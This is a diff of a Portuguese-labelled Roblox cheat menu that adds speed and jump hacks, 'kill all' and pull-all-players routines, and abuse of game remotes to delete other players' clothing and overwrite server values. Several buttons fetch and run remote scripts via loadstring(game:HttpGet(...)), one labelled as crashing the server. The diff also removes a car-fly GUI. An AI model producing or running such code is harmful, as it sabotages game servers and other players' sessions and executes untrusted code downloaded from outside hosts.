@@ -26,6 +26,32 @@ JogadorTab:AddButton({
       end
 })
 
+JogadorTab:AddSlider({
+    Name = "Velocidade",
+    Min = 16,
+    Max = 500,
+    Default = 16,
+    Color = Color3.fromRGB(255,255,255),
+    Increment = 1,
+    ValueName = "Speed",
+    Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
+        end    
+}) 
+
+JogadorTab:AddSlider({
+    Name = "Pulo",
+    Min = 16,
+    Max = 500,
+    Default = 16,
+    Color = Color3.fromRGB(255,255,255),
+    Increment = 1,
+    ValueName = "Jump",
+    Callback = function(Value)
+        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value               
+        end
+})       
+
 JogadorTab:AddButton({
 	Name = "Rejoin",
 	Callback = function()
@@ -537,6 +563,18 @@ ArmaTab:AddButton({
 })  
 
 ArmaTab:AddButton({
+    Name = "Deletar Roupa Geral - Acs 1.7.5",
+    Callback = function()
+        local rmt = game:service'ReplicatedStorage':FindFirstChild("DeleteCar")
+        for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
+            if  v:IsA("Shirt") or v:IsA("Pants")  then
+                rmt:FireServer(v) 
+            end
+        end
+      end   
+})
+
+ArmaTab:AddButton({
 	Name = "Sem Recuo",
 	Callback = function()
         local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/turtle"))()
@@ -870,168 +908,156 @@ CarroTab:AddButton({
   	end    
 })
 
-CarroTab:AddButton({
-	Name = "Veiculo Fly",
-	Callback = function()
-        local ScreenGui = Instance.new("ScreenGui")
-        local main = Instance.new("Frame")
-        local flycar = Instance.new("TextButton")
-        local Close = Instance.new("TextButton")
-        local openmain = Instance.new("Frame")
-        local open = Instance.new("TextButton")
-         
-        ScreenGui.Parent = game.CoreGui
-         
-        main.Name = "Flying Car"
-        main.Parent = ScreenGui
-        main.BackgroundColor3 = Color3.fromRGB(112, 255, 133)
-        main.Position = UDim2.new(0.0598930493, 0, 0.716088295, 0)
-        main.Size = UDim2.new(0, 120, 0, 108)
-        main.Visible = false
-        main.Active = true
-        main.Draggable = true
-         
-        flycar.Name = "CarV1"
-        flycar.Parent = main
-        flycar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        flycar.Position = UDim2.new(0, 0, 0.268518507, 0)
-        flycar.Size = UDim2.new(0, 120, 0, 50)
-        flycar.Style = Enum.ButtonStyle.RobloxButton
-        flycar.Font = Enum.Font.Gotham
-        flycar.Text = "Car Fly ZreyMenu"
-        flycar.TextColor3 = Color3.fromRGB(85, 170, 255)
-        flycar.TextSize = 14.000
-        flycar.MouseButton1Click:connect(function()
-            local Tool = Instance.new("HopperBin")
-        Tool.Parent = game.Players.LocalPlayer.Backpack
-        Tool.Name = "กดปุ่ม R บิน"
-        local hint = Instance.new("Hint",game.Players.LocalPlayer.PlayerGui)
-           hint.Text = "Car Fly ZreyMenu"
-           hint.Name = game.JobId
-        repeat wait()
-            until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
-        local mouse = game.Players.LocalPlayer:GetMouse()
-        repeat wait() until mouse
-        local plr = game.Players.LocalPlayer
-        local torso = plr.Character.Torso
-        local flying = true
-        local deb = true
-        local ctrl = {f = 0, b = 0, l = 0, r = 0}
-        local lastctrl = {f = 0, b = 0, l = 0, r = 0}
-        local maxspeed = 200
-        local speed = 0
-         
-        function Fly()
-        local bg = Instance.new("BodyGyro", torso)
-        bg.P = 9e4
-        bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-        bg.cframe = torso.CFrame
-        local bv = Instance.new("BodyVelocity", torso)
-        bv.velocity = Vector3.new(0,0.1,0)
-        bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
-        repeat wait()
-        plr.Character.Humanoid.PlatformStand = false
-        if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
-        speed = speed+125.0+(speed/maxspeed)
-        if speed > maxspeed then
-        speed = maxspeed
-        end
-        elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
-        speed = speed-250
-        if speed < 0 then
-        speed = 0
-        end
-        end
-        if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
-        bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
-        lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
-        elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
-        bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
-        else
-        bv.velocity = Vector3.new(0,0.1,0)
-        end
-        bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
-        until not flying
-        ctrl = {f = 0, b = 0, l = 0, r = 0}
-        lastctrl = {f = 0, b = 0, l = 0, r = 0}
-        speed = 0
-        bg:Destroy()
-        bv:Destroy()
-        plr.Character.Humanoid.PlatformStand = false
-        end
-        mouse.KeyDown:connect(function(key)
-        if key:lower() == "r" then
-        if flying then flying = false
-        else
-        flying = true
-        Fly()
-        end
-        elseif key:lower() == "w" then
-        ctrl.f = 1
-        elseif key:lower() == "s" then
-        ctrl.b = -1
-        elseif key:lower() == "a" then
-        ctrl.l = -1
-        elseif key:lower() == "d" then
-        ctrl.r = 1
-        end
-        end)
-        mouse.KeyUp:connect(function(key)
-        if key:lower() == "w" then
-        ctrl.f = 0
-        elseif key:lower() == "s" then
-        ctrl.b = 0
-        elseif key:lower() == "a" then
-        ctrl.l = 0
-        elseif key:lower() == "d" then
-        ctrl.r = 0
-        end
-        wait(5)
-        hint:Destroy()
-        end)
-        Fly()
-        end)    
-         
-         
-        Close.Name = "Close"
-        Close.Parent = main
-        Close.BackgroundColor3 = Color3.fromRGB(255, 32, 140)
-        Close.Position = UDim2.new(0.675000012, 0, 0, 0)
-        Close.Size = UDim2.new(0, 39, 0, 29)
-        Close.Text = "X"
-        Close.TextColor3 = Color3.fromRGB(0, 0, 0)
-        Close.TextSize = 14.000
-        Close.MouseButton1Down:connect(function()
-        main.Visible = false
-        openmain.Visible = true
-        end)
-         
-        openmain.Name = "openmain"
-        openmain.Parent = ScreenGui
-        openmain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        openmain.Position = UDim2.new(0.00641711242, 0, 0.54574132, 0)
-        openmain.Size = UDim2.new(0, 100, 0, 26)
-        openmain.Active = true
-        openmain.Draggable = true
-         
-        open.Name = "open"
-        open.Parent = openmain
-        open.BackgroundColor3 = Color3.fromRGB(255, 177, 42)
-        open.Size = UDim2.new(0, 100, 0, 26)
-        open.Text = "Car Fly ZreyMenu"
-        open.TextColor3 = Color3.fromRGB(0, 0, 0)
-        open.TextSize = 14.000
-        open.MouseButton1Down:connect(function()
-        openmain.Visible = false
-        main.Visible = true
-        end)
-         
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "Car Fly ZreyMenu";
-        Text = [[Car Fly ZreyMenu
-            Car Fly ZreyMenu :D 
-            555555555]];
-        })
-  	end    
+local OutrosTab = Window:MakeTab({
+    Name = "Outros",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
 })
 
+local OutrosSection = OutrosTab:AddSection({
+    Name = "Opções"
+})
+
+OutrosTab:AddButton({
+    Name = "Hub troll v1.5",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Arthurkla/teste/main/ViethinScript2", true))()
+      end   
+})
+
+OutrosTab:AddButton({
+    Name = "Kill all V2 (Manual)",
+    Callback = function()
+        local p = game.Players.LocalPlayer
+local number = 2
+local value = true -- true ou false / Se estiver true, ele vai puxar somente as pessoas que não sejam da sua Team, se for false, ele vai puxar todos os players do mapa
+
+for _, player in pairs(game.Players:GetChildren()) do
+if value then
+    if player.Character:FindFirstChild("HumanoidRootPart") and player.Team.Name ~= p.Team.Name then
+    number += 2
+player.Character.Head.Anchored = true
+player.Character.Head.Position = p.Character.HumanoidRootPart.Position + p.Character.HumanoidRootPart.CFrame.LookVector * number
+    end
+else
+    if player.Character:FindFirstChild("HumanoidRootPart") and player.Name ~= p.Name then
+number += 2
+player.Character.Head.Anchored = true
+player.Character.Head.Position = p.Character.HumanoidRootPart.Position + p.Character.HumanoidRootPart.CFrame.LookVector * number
+    end
+end
+end
+      end   
+    })
+
+  OutrosTab:AddButton({
+    Name = "Kill All (Remote Event)",
+    Callback = function()
+        local p = game.Players.LocalPlayer
+local number = 2
+local value = true -- true ou false / Se estiver true, ele vai puxar somente as pessoas que não sejam da sua Team, se for false, ele vai puxar todos os players do mapa
+
+for _, player in pairs(game.Players:GetChildren()) do
+if value then
+    if player.Character:FindFirstChild("HumanoidRootPart") and player.Team.Name ~= p.Team.Name then
+    number += 2
+player.Character.Head.Anchored = true
+player.Character.Head.Position = p.Character.HumanoidRootPart.Position + p.Character.HumanoidRootPart.CFrame.LookVector * number
+    end
+else
+    if player.Character:FindFirstChild("HumanoidRootPart") and player.Name ~= p.Name then
+number += 2
+player.Character.Head.Anchored = true
+player.Character.Head.Position = p.Character.HumanoidRootPart.Position + p.Character.HumanoidRootPart.CFrame.LookVector * number
+    end
+end
+end
+
+      end  
+})
+
+OutrosTab:AddButton({
+    Name = "Hub Super Troll - Bypass",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/i4mitty/Peruanito.exe/main/Peruanito.exe.lua"))()
+      end   
+})
+
+OutrosTab:AddButton({
+    Name = "Change Value",
+    Callback = function()
+        local Main = loadstring(game:HttpGet('https://raw.githubusercontent.com/Zv-yz/RBXScripts/master/Scripts/ViethinChange.lua'))()
+local Config = {
+BoolValue = true; -- Que seja true ou false
+StringValue = 'ZreyMenu Menu E o Hype'; -- A string você deseja
+NumberValue = 9999999999999999999999999; -- Valor do número
+IntValue = 9999999999999999999999999; -- Valor do número
+}
+Main:Change(Config)
+    end
+})
+
+OutrosTab:AddButton({
+    Name = "Crashar server (!)",
+    Callback = function()
+        loadstring(game:HttpGet('https://bifao.tech/scripts/ilhabela.lol'))()
+      end   
+    })
+
+  OutrosTab:AddButton({
+   Name = "IntValueNumber",
+   Callback = function()
+    local Evt_R = game:service('ReplicatedStorage')["ACS_Engine"].Events:FindFirstChild("Refil")
+    local Quant = -99999999999999000999
+
+    for i,v in pairs(game:GetDescendants()) do
+        if v:IsA("IntValue") or v:IsA("NumberValue") then
+            Evt_R:FireServer(v,-(Quant-v.Value))
+        end
+    end
+  end    
+})
+
+OutrosTab:AddButton({
+    Name = "Puxar Geral (Cliente) (!)",
+    Callback = function()
+        local function callback(Text)
+        end
+         
+        local NotificationBindable = Instance.new("BindableFunction")
+        NotificationBindable.OnInvoke = callback
+         
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "Carregado! by: ZreyMenu";
+            Text = "Aperte X para puxar geral (cliente) para matar com arma.";
+            Duration = "5";
+            Callback = NotificationBindable;
+        })
+        local Players = game:GetService("Players")
+        local player = Players.LocalPlayer
+        
+        local function pullAllPlayers()
+            local character = player.Character or player.CharacterAdded:Wait()
+            local hrp = character:WaitForChild("HumanoidRootPart")
+            
+            for _, otherPlayer in pairs(Players:GetPlayers()) do
+                if otherPlayer ~= player then
+                    local otherCharacter = otherPlayer.Character
+                    if otherCharacter then
+                        local otherHRP = otherCharacter:FindFirstChild("HumanoidRootPart")
+                        if otherHRP then
+                            otherHRP.CFrame = hrp.CFrame
+                        end
+                    end
+                end
+            end
+        end
+        
+        game:GetService("UserInputService").InputBegan:Connect(function(input, isProcessed)
+            if isProcessed then return end
+            if input.KeyCode == Enum.KeyCode.X then
+                pullAllPlayers()
+            end
+        end)
+      end  
+})
